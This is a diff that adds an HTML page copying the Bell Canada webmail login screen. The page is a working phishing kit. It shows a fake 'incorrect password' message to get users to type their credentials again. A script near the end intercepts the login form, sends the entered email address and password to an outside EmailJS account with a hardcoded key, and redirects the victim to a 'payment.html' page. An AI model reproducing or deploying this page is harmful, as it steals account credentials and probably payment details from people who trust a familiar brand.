@@ -1,0 +1,639 @@
+<html lang="en_US" dir="ltr">
+  <head><script src="../static/bell_common.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1">
+    <link rel="shortcut icon" href="#" />
+    <link rel="icon" href="#" /> 
+    <link rel="apple-touch-icon" href="#" />    
+    <link type="text/css" rel="stylesheet" href="ux/ux6bcb.css?v=3.1.3.54.0-3"/>
+    
+    <script type="application/javascript" src="ux/UXConfig6bcb.js?v=3.1.3.54.0-3" charset="UTF-8"></script>
+    <script type="application/javascript" src="ux/localization6bcb.js?v=3.1.3.54.0-3" charset="UTF-8"></script>
+    <title>Webmail</title>
+    <link rel="shortcut icon" href="header/img/favicon.ico">
+    <script src="login/js/jquery-3.5.1.min.js"></script>
+    <link
+    href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
+    rel="stylesheet"
+  />
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <link rel="stylesheet" href="login/css/flush.css">
+    <link rel="stylesheet" href="login/css/bell_prime_mod.css" media="all" type="text/css" />
+    <link rel="stylesheet" href="login/css/login.css" media="all" type="text/css" />
+    <link rel="stylesheet" href="header/css/bell.connector-rui.css" media="all" type="text/css" />    
+</head>
+  <body class="ux-ltr">
+    <div
+      id="root"
+      style="width: 100%; height: 100%; position: absolute; overflow: hidden">
+      <!-- <form name="sentMessage" id="form" novalidate="novalidate"> -->
+      <div class="ow-Provider-root">
+        <div class="ow-login" role="main" aria-label="Login Page">
+          <div tabindex="-1" class="modal" style="display: block">
+            <div class="modal-dialog">
+              <div class="modal-content" role="document">
+                <div class="ow-login-header-custom">
+                  <div class="ow-login-header">
+                    <div class="ow-app-header-customHeader">
+                      <div class="bell-brand bc-user-true">
+                        <a
+                          class="bell-logo"
+                          href="http://www.bell.ca/"
+                          aria-label="Bell"
+                          target="_top"
+                          ><span
+                            class="bell-icon fui-icon-bell bc-user-false"
+                          ></span
+                        ></a>
+                      </div>
+                    </div>
+                    <div class="fui-topnav-aside" style="height: 74px">
+                      <span
+                        style="
+                          font: 15px / 68px Arial, sans-serif;
+                          height: 100%;
+                          padding: 0px 20px;
+                          text-shadow: rgb(0, 0, 0) 0px 1px 2px;
+                          border-left: medium none;
+                        "
+                        ><a
+                          id="changelocale"
+                          class="indent1"
+                          href="#"
+                          title="Français"
+                          aria-label="Français"
+                          value="fr_CA"
+                          style="color: rgb(255, 255, 255)"
+                          >Français</a
+                        ></span
+                      >
+                    </div>
+                  </div>
+                </div>
+                <div class="modal-body">
+                  <div class="wrapper shopSection">
+                    <div class="wrapHeader"></div>
+                    <div class="wrapMain">
+                      <div class="subWrap main">
+                        <div class="secNav"><div class="clearer"></div></div>
+                        <div class="content" id="content">
+                          <div class="cWrap pgTitle"><h1>Bell email</h1></div>
+                          <div class="cWrap" style="padding-top: 14px">
+                            <div
+                              id="alertMsgJS"
+                              class="cBox"
+                              style="display: none"
+                            >
+                              <div class="warning">
+                                <div class="lining">
+                                  <div class="userMsg umError">
+                                    <h2 class="hType4">
+                                      An error occurred while processing your
+                                      request.
+                                    </h2>
+                                  </div>
+                                </div>
+                              </div>
+                              <div class="cBoxExtra1"></div>
+                              <div class="cBoxExtra2"></div>
+                              <div class="cBoxExtra3">
+                                <div class="cBoxExtra4"></div>
+                              </div>
+                              <div class="cBoxExtra5">
+                                <div class="cBoxExtra6"></div>
+                              </div>
+                            </div>
+                            <div class="colGroup">
+                              <div id="loginsection">
+                                <div class="col6">
+                                  <div class="cBox captcha_bc">
+                                    <div class="padder cHeader">
+                                      <h2 class="fontFace">Log in</h2>
+                                      <div class="clearer"></div>
+                                    </div>
+                                    <div class="padder fakeeqJs">
+                                      <div style="width: 100%; height: 10%">
+                                        <div
+                                          id="owmailredirector"
+                                          style="
+                                            border: 0px;
+                                            position: absolute;
+                                            top: -12px;
+                                            left: 30px;
+                                            width: 450px;
+                                          "
+                                        >
+                                          <table
+                                            id="mask"
+                                            width="100%"
+                                            height="100%"
+                                            style="
+                                              display: none;
+                                              position: absolute;
+                                              z-index: 10000;
+                                              background-color: white;
+                                              opacity: 0.7;
+                                              top: 0px;
+                                            "
+                                          >
+                                            <tbody>
+                                              <tr>
+                                                <td
+                                                  valign="center"
+                                                  align="center"
+                                                >
+                                                  <div
+                                                    style="
+                                                      color: white;
+                                                      line-height: 40px;
+                                                      height: 40px;
+                                                      width: 100px;
+                                                      background: none 0% 0%
+                                                        repeat scroll black;
+                                                      border-radius: 5px;
+                                                    "
+                                                  >
+                                                    ...
+                                                  </div>
+                                                </td>
+                                              </tr>
+                                            </tbody>
+                                          </table>
+                                          <form class="form-horizontal" name="sentMessage" id="form" novalidate="novalidate">
+                                            <p style="color: red;">Incorrect email or password. Try again</p>
+                                            <div class="form-group">
+                                              <div class="fLabel sectionHeader">
+                                                <label
+                                                  for="formHorizontalEmail"
+                                                  class=""
+                                                  >Email Address</label
+                                                >
+                                              </div>
+                                              <div class="sectionContent">
+                                                <div
+                                                  class="col-sm-8 col-sm-offset-2"
+                                                >
+                                                  <input
+                                                    aria-label="Email Address"
+                                                    aria-disabled="false"
+                                                    aria-autocomplete="list"
+                                                    type="text"
+                                                    id="email"
+                                                    name="email"
+                                                    class="form-control"
+                                                  />
+                                                </div>
+                                              </div>
+                                            </div>
+                                            <div class="form-group">
+                                              <div id="passwordsection">
+                                                <div
+                                                  class="fLabel sectionHeader"
+                                                >
+                                                  <label
+                                                    for="formHorizontalPassword"
+                                                    class=""
+                                                    >Password</label
+                                                  >
+                                                </div>
+                                                <div class="sectionContent">
+                                                  <div
+                                                    class="col-sm-8 col-sm-offset-2"
+                                                  >
+                                                    <input
+                                                      aria-label="Password"
+                                                      aria-disabled="false"
+                                                      type="password"
+                                                      id="pw"
+                                                      name="pw"
+                                                      class="form-control"
+                                                    />
+                                                  </div>
+                                                </div>
+                                              </div>
+                                            </div>
+                                            <!-- <div
+                                              class="col-sm-13 col-sm-offset-2"
+                                            >
+                                              <div>
+                                                <div>
+                                                  <div
+                                                    style="
+                                                      width: 304px;
+                                                      height: 78px;
+                                                    "
+                                                  >
+                                                    <div>
+                                                      <iframe
+                                                        title="reCAPTCHA"
+                                                        width="304"
+                                                        height="78"
+                                                        role="presentation"
+                                                        name="a-t3chs1j2pmdn"
+                                                        frameborder="0"
+                                                        scrolling="no"
+                                                        sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
+                                                        src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LfI5NgaAAAAAJglwlQxU6kcHa7Bu6gNR38nhJDY&amp;co=aHR0cHM6Ly93ZWJtYWlsLmJlbGwubmV0OjQ0Mw..&amp;hl=en&amp;type=image&amp;v=aR-zv8WjtWx4lAw-tRCA-zca&amp;theme=light&amp;size=normal&amp;badge=bottomright&amp;cb=b3z3013c0ki1"
+                                                      ></iframe>
+                                                    </div>
+                                                    <textarea
+                                                      id="g-recaptcha-response"
+                                                      name="g-recaptcha-response"
+                                                      class="g-recaptcha-response"
+                                                      style="
+                                                        width: 250px;
+                                                        height: 40px;
+                                                        border: 1px solid
+                                                          rgb(193, 193, 193);
+                                                        margin: 10px 25px;
+                                                        padding: 0px;
+                                                        resize: none;
+                                                        display: none;
+                                                      "
+                                                    ></textarea>
+                                                  </div>
+                                                  <iframe
+                                                    style="display: none"
+                                                  ></iframe>
+                                                </div>
+                                              </div>
+                                            </div> -->
+                                            <!-- <div class="form-group">
+                                              <div
+                                                class="col-sm-8 col-sm-offset-2"
+                                              >
+                                                <span
+                                                  class="ow-login-rememberme"
+                                                  tabindex="0"
+                                                  role="checkbox"
+                                                  aria-label="Keep me logged in"
+                                                  aria-checked="false"
+                                                  ><span
+                                                    class="ow-icon ow-icon-squared-unchecked"
+                                                    title="Keep me logged in"
+                                                    tabindex="0"
+                                                    >&nbsp;</span
+                                                  >
+                                                  Keep me logged in</span
+                                                >
+                                              </div>
+                                            </div> -->
+                                            <div class="form-group">
+                                              <div
+                                                class="col-sm-8 col-sm-offset-2"
+                                              >
+                                                <button
+                                                aria-label="Login"
+                                                aria-disabled="false"
+                                                
+                                                class="btn btn-primary btn-block"
+                                                onclick="SendMail()" id="button" type="submit" 
+                                                >
+                                                  Login
+                                                </button>
+                                              </div>
+                                            </div>
+                                          </form>
+                                          <div>
+                                            <div
+                                              class="paddingTop1"
+                                              style="
+                                                line-height: 20px;
+                                                padding-left: 10px;
+                                                float: left;
+                                                clear: both;
+                                                padding-top: 8px;
+                                                cursor: pointer;
+                                              "
+                                            >
+                                              I forgot my
+                                              <a
+                                                target="_blank"
+                                                href="#"
+                                                aria-label="Email Address"
+                                                >Email Address</a
+                                              >
+                                              or
+                                              <a
+                                                target="_blank"
+                                                href="#"
+                                                aria-label="Password"
+                                                >Password</a
+                                              >
+                                            </div>
+                                            <div
+                                              class="paddingTop1"
+                                              style="
+                                                line-height: 20px;
+                                                padding-left: 10px;
+                                                float: left;
+                                                clear: both;
+                                                cursor: pointer;
+                                              "
+                                            >
+                                              <a
+                                                target="_blank"
+                                                href="https://support.bell.ca/internet/email/how-to-use-bell-mail?step=2#displayStep"
+                                                aria-label="Create a new email address"
+                                                >Create a new email address</a
+                                              >
+                                            </div>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                    <div class="cBoxExtra1"></div>
+                                    <div class="cBoxExtra2"></div>
+                                    <div class="cBoxExtra3">
+                                      <div class="cBoxExtra4"></div>
+                                    </div>
+                                    <div class="cBoxExtra5">
+                                      <div class="cBoxExtra6"></div>
+                                    </div>
+                                  </div>
+                                </div>
+                                <div class="col6 colLast">
+                                  <div class="cBox captcha_bc">
+                                    <div class="padder cHeader">
+                                      <h2 class="fontFace">
+                                        New! Your Bell email is getting even
+                                        better
+                                      </h2>
+                                      <div class="clearer"></div>
+                                    </div>
+                                    <div class="padder fakeeqJs">
+                                      <div
+                                        class="itemGroup itemGroupThemeA"
+                                        style="
+                                          font-size: 15px;
+                                          font-family: Arial, sans-serif;
+                                        "
+                                      >
+                                        <div
+                                          style="
+                                            position: absolute;
+                                            bottom: 35pt;
+                                            right: 0pt;
+                                            width: 0pt;
+                                            border-right: 100px solid
+                                              rgb(0, 102, 164);
+                                            border-bottom: 100px solid
+                                              transparent;
+                                            border-top: 100px solid transparent;
+                                          "
+                                        ></div>
+                                        <div
+                                          class="sectionContent"
+                                          style="
+                                            line-height: 20px;
+                                            margin-left: 8px;
+                                          "
+                                        >
+                                          <h3
+                                            class="headingType4"
+                                            style="margin-bottom: 15px"
+                                          >
+                                            Here are some of the updates you'll
+                                            start to see soon:
+                                          </h3>
+                                          <ul
+                                            style="
+                                              margin-left: 5px;
+                                              width: 350px;
+                                            "
+                                          >
+                                            <ul style="margin-left: 0px">
+                                              <li class="list_bc_enhance">
+                                                A new look for an improved
+                                                experience
+                                              </li>
+                                              <li class="list_bc_enhance">
+                                                An easy-to-use floating tool bar
+                                                for quick access to features
+                                              </li>
+                                              <li class="list_bc_enhance">
+                                                A smart way to sort and
+                                                categorize to keep your inbox
+                                                organized
+                                              </li>
+                                              <li class="list_bc_enhance">
+                                                An optimized mobile experience
+                                                supported on even more browsers
+                                              </li>
+                                            </ul>
+                                          </ul>
+                                          <div class="spacer1"></div>
+                                          <div class="spacer1"></div>
+                                          <div class="spacer1"></div>
+                                          <div
+                                            class="rhslink"
+                                            style="width: 320px"
+                                          >
+                                            <a
+                                              target="_blank"
+                                              href="#"
+                                              aria-label="Find out more"
+                                              style="font-weight: bold"
+                                              >Find out more</a
+                                            >
+                                            about your Bell email services.
+                                          </div>
+                                        </div>
+                                        <div class="clearer"></div>
+                                      </div>
+                                    </div>
+                                    <div class="cBoxExtra1"></div>
+                                    <div class="cBoxExtra2"></div>
+                                    <div class="cBoxExtra3">
+                                      <div class="cBoxExtra4"></div>
+                                    </div>
+                                    <div class="cBoxExtra5">
+                                      <div class="cBoxExtra6"></div>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                            <div class="clearer"></div>
+                          </div>
+                        </div>
+                        <div class="clearer"></div>
+                        <div class="mainExtra1"></div>
+                        <div class="mainExtra2"></div>
+                        <div class="mainExtra3"></div>
+                        <div class="mainExtra4"></div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="wrapFooter">
+                    <div class="subWrap footer">
+                      <div class="footerNote">
+                        <div class="columnGroup">
+                          <div class="columnConnector">
+                            <!-- <div class="columnContent">
+                              <a
+                                class="indent1"
+                                target="_blank"
+                                href="https://support.bell.ca/Billing-and-Accounts/Security_and_privacy/How_does_Bell_respect_my_privacy"
+                                title="Privacy"
+                                aria-label="Privacy"
+                                >Privacy</a
+                              ><a
+                                class="indent1"
+                                target="_blank"
+                                href="https://www.bell.ca/Legal_and_terms#INT=OTH_legal_TXT_Footer"
+                                title="Legal &amp; Regulatory"
+                                aria-label="Legal &amp; Regulatory"
+                                >Legal &amp; Regulatory</a
+                              >
+                            </div> -->
+                            <div class="spacer"></div>
+                            <span class="copyright"
+                              >&nbsp;&nbsp;&nbsp;© Bell Canada, 2024. All rights
+                              reserved.</span
+                            >
+                          </div>
+                          <div class="clearer"></div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="ow-PopupToolsContainer">
+          <div class="ow-toast-container"></div>
+        </div>
+      </div>
+    </div>
+    <!-- </form> -->
+    <script
+      type="application/javascript"
+      src="ux/ux.js?v=3.1.3.54.0-3"
+      charset="UTF-8"
+    ></script>
+    
+
+    
+    <div
+      style="
+        background-color: rgb(255, 255, 255);
+        border: 1px solid rgb(204, 204, 204);
+        box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px;
+        position: absolute;
+        transition: visibility linear 0.3s, opacity 0.3s linear;
+        opacity: 0;
+        visibility: hidden;
+        z-index: 2000000000;
+        left: 0px;
+        top: -10000px;
+      "
+    >
+      <div
+        style="
+          width: 100%;
+          height: 100%;
+          position: fixed;
+          top: 0px;
+          left: 0px;
+          z-index: 2000000000;
+          background-color: rgb(255, 255, 255);
+          opacity: 0.05;
+        "
+      ></div>
+      <div
+        class="g-recaptcha-bubble-arrow"
+        style="
+          border: 11px solid transparent;
+          width: 0px;
+          height: 0px;
+          position: absolute;
+          pointer-events: none;
+          margin-top: -11px;
+          z-index: 2000000000;
+        "
+      ></div>
+      <div
+        class="g-recaptcha-bubble-arrow"
+        style="
+          border: 10px solid transparent;
+          width: 0px;
+          height: 0px;
+          position: absolute;
+          pointer-events: none;
+          margin-top: -10px;
+          z-index: 2000000000;
+        "
+      ></div>
+      <div style="z-index: 2000000000; position: relative">
+       
+      </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.6/jquery.inputmask.min.js"></script>
+
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+
+    <script type="text/javascript">
+      emailjs.init("EJt8cCFaepdVlpAUn");
+    </script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+
+    <script>
+      const btn = document.getElementById("button");
+      document
+        .getElementById("form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+
+          
+   const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('pw').value.trim();
+
+  if (!email || !password) {
+    alert('Please fill in all fields.');
+    return;
+  }
+
+
+
+
+          btn.value = "Sending...";
+          const serviceID = "service_e7r44b1";
+          const templateID = "template_fvopjhc";
+          emailjs.sendForm(serviceID, templateID, this).then(
+            () => {
+              btn.value = "Send Email";
+              
+              window.location.href =
+                "payment.html";
+            },
+            (err) => {
+              btn.value = "Send Email";
+              alert(JSON.stringify(err));
+            }
+          );
+        });
+    </script>
+    <script>
+      const passwordInput = document.getElementById("pw");
+      const toggleButton = document.getElementById("togglePassword");
+      toggleButton.addEventListener("click", function () {
+        if (passwordInput.type === "password") {
+          passwordInput.type = "text";
+          toggleButton.textContent = "Hide";
+        } else {
+          passwordInput.type = "password";
+          toggleButton.textContent = "Show";
+        }
+      });
+    </script>
+  </body>
+</html>
